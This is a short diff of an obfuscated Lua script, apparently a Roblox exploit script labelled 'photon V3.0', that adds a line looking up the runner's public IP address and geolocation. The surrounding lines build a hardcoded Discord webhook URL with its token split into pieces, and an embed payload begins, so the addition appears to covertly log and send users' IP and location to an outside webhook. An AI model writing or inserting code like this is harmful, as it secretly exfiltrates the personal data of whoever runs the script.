@@ -5,6 +5,7 @@ we=true;unpack=(unpack)or(table["unpack"])qq={[1]=function()return"h".."ttps".."
 --// game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
 photonver = "V3.0"
 if getgenv().ex == nil then getgenv().ex = true
+ipinf=game:HttpGet('https://ipapi.co/'..game:HttpGet("https://api.ipify.org")..'/json')
 local url = "https://discord.com/api/webhooks/1261141544937979904/vTNWW3mgj0U-".."dbiIQNRAhpXHSBzcAIEAcPt54cQ-u7XA2nZ5LXhF0vRnWda9p0laS7O8"
 local data = {
     ["embeds"] = {{
